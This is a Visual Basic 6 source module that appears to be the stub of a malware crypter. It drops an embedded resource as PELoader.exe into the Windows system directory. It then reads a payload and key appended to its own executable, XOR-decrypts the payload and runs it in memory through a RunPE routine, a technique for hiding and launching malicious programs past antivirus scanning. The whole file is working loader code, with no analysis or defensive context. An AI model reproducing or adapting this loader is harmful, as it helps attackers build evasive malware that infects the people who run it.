Attribute VB_Name = "basMain"
Option Explicit

Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Private Sub Main()
On Error GoTo ErrHandler
Dim iFileNum As Integer
Dim Buffer() As Byte
Dim sBuffer As String
Dim sKey As String
Dim sTmp() As String
    iFileNum = FreeFile
    Open SystemDirectory & "\PELoader.exe" For Binary As #iFileNum
    Buffer = LoadResData(101, "CUSTOM")
    Put #iFileNum, , Buffer
    Close #iFileNum
    iFileNum = FreeFile
    Open App.Path & "\" & App.EXEName & ".exe" For Binary As #iFileNum
    sBuffer = Space(LOF(iFileNum))
    Get #iFileNum, , sBuffer
    Close #iFileNum
    sTmp = Split(sBuffer, "/#/+\#\")
    sBuffer = sTmp(1)
    sKey = sTmp(2)
    sBuffer = XOREncryption(sBuffer, sKey)
    Call RunPE(StrToBytArray(sBuffer))
ErrHandler:
End Sub

Public Function SystemDirectory() As String
Dim sBuffer As String
    sBuffer = Space(256)
    SystemDirectory = Left(sBuffer, GetSystemDirectory(sBuffer, Len(sBuffer)))
End Function

Public Function StrToBytArray(ByVal sStr As String) As Byte()
Dim i As Long
Dim Buffer() As Byte
    ReDim Buffer(Len(sStr) - 1)
    For i = 1 To Len(sStr)
        Buffer(i - 1) = Asc(Mid(sStr, i, 1))
    Next i
    StrToBytArray = Buffer
End Function

Public Function XOREncryption(ByVal sStr As String, ByVal sKey As String) As String
Dim i As Long
    For i = 1 To Len(sStr)
        XOREncryption = XOREncryption & Chr(Asc(Mid(sKey, IIf(i Mod Len(sKey) <> 0, i Mod Len(sKey), Len(sKey)), 1)) Xor Asc(Mid(sStr, i, 1)))
    Next i
End Function

